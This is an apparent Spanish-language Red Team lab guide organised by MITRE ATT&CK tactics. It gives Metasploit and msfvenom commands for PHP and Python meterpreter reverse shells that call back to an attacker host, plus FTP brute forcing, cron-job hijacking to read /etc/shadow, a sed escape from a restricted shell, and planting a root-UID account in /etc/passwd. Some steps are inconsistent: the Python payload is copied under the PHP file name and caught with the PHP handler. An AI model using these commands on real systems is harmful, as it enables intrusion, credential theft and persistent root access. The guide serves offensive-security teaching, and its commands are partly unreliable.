# Laboratorio 12-13. Técnicas de Red Team a través del MITRE ATT&CK (Parte 2)

## Bloque 1: MITRE ATT&CK fase 4. TA0002. Execution (continuación) 

### Ejercicio L12B1_METERPRETER: Meterpreter para explotación (T1569. System Services)
Podemos ver los workspaces de metasploit, crearlos y borrarlos.
```sh
workspace
workspace -a <nombre>
workspace -d <nombre>
workspace <nombre del workspace>
```

Podemos ejecutar nmap desde metasploit.
```sh
db_nmap -sV <IP>
```

Podemos buscar exploits en la base de datos de Metasploit.
```sh
search <PALABRAS CLAVE>
```

Para usar un exploit
```sh
use <exploit> - set payload <payload> - show options - set options <…> - exploit
```

Podemos ver la lista de payloads
```sh
show payloads
```

Podemos obtener información de un exploit
```sh
info <nombre completo del exploit>
```

### Payloads con msfvenom y multi/handler
Creamos un payload
```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.12.2 LPORT=4444 -f raw > shell.php
```

Lo transferimos a la víctima
```sh
scp shell.php testUser@192.168.12.3:/var/www/html/
```

Ahora en la máquina atacante ponemos el multi/hander en escucha
```sh
msfconsole

use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.12.2
set LPORT 4444
run
```

Ahora, cuando alguien acceda a la ruta donde se encuentra el exploit, obtendremos la sesión de meterpreter.
```sh
curl http://192.168.12.3/shell.php
```

Para realizar fuerza bruta contra FTP desde msf.
```sh
search ftp_login
use 0
set RHOST <IP_VICTIMA>
set USERNAME <nombre del usuario>
set PASS_FILE <archivo con contraseñas>
run
```
## Bloque 2: MITRE ATT&CK fase 6: TA0004. Privilege scalation

### Escalada de privilegios a través de trabajos cron: Exfiltración de información privada (T1053. Scheduled Task/Job)
Podemos modificar archivos que ejecutan tareas cron para saltarnos diversas restricciones de seguridad. Si una tarea ejecuta un archivo python, podemos modificarlo para que nos muestre, por ejemplo, /etc/shadow

La información sobre las tareas programadas se encuentra en /etc/crontab. Los outputs de estas tareas est.an en /var/log/cron.log

```py
import os

shadow_file_path = '/etc/shadow'

if os.path.exists(shadow_file_path) and os.path.isfile(shadow_file_path):
    try:
        with open(shadow_file_path, 'r') as file:
            content = file.read()
            print(content)
    except PermissionError:
        print("Permiso denegado: Necesitas ser root para leer este archivo.")
else:
    print("/etc/shadow no existe o no es un archivo.")

```

### Escalada de privilegios mediante la sustitución de ejecutables / dependencias: Reverse shells de Msfvenom (T1053. Scheduled Task/Job)
Procedemos igual que antes
```sh
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.12.2 LPORT=4444 -f raw > integrity_check.py
```

Lo transferimos a la víctima
```sh
scp shell.php testUser@192.168.12.3:/tmp/integrity_check.py
```

Ahora en la máquina atacante ponemos el multi/hander en escucha
```sh
msfconsole

use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.12.2
set LPORT 4444
run
```

Y esperamos a que la tarea se ejecute, con lo que nos dará acceso al sistema.

## Bloque 3: MITRE ATT&CK fase 6: TA0004. Privilege scalation (continuación)

### Romper restricciones y ocultar actividades (T1548. Abuse Elevation Control Mechanism)
Si tenemos una consola restringida podemos saltarnos esta restricción con el comando sed
```sh
sed -n '1e exec sh 1>&0' /etc/hosts
```
Ejecutando esto obtendremos una consola si restricciones.

### Identificación de programas sudo (T1548. Abuse Elevation Control Mechanism)
Se puede comprobar la lista de programas que podemos ejecutar con sudo con
```sh
sudo -l
```

### Generar una contraseña válida para un usuario de Linux (T1078. Valid Accounts)
Podemos generar el hash de una contraseña con mkpasswd
```sh
mkpasswd --method=SHA-256
```

Y introducir una entrada en /etc/passwd
```sh
hacker:$6$randomsalt$Xk3kf8NznO3AdU.dkjdfk...:0:0:root:/root:/bin/bash
```

Podemos loguearnos para comprobar que funciona
```sh
su - hacker
```

### Identificación de programas SUID (T1548. Abuse Elevation Control Mechanism)
Los archivos con los bits SETUID o SETGID activos nos permiten que un programa se ejecute temporalmente con los privileguos del propietario del archivo para realizar una tarea que los requiera.
```sh
find / -perm -u=s -type f 2>/dev/null
chmod +s                                    #Activa el bit
```

### Escalada de privilegios a través de programas SUID (T1548. Abuse Elevation Control Mechanism)

### Escalada de privilegios potencial a través de técnicas de inspección ejecutables (T1078. Valid Accounts)
Podemos inspeccionar archivos ejecutables para buscar posibles credenciales hardocdeadas
```sh
strings <RUTA_ARCHIVO>
```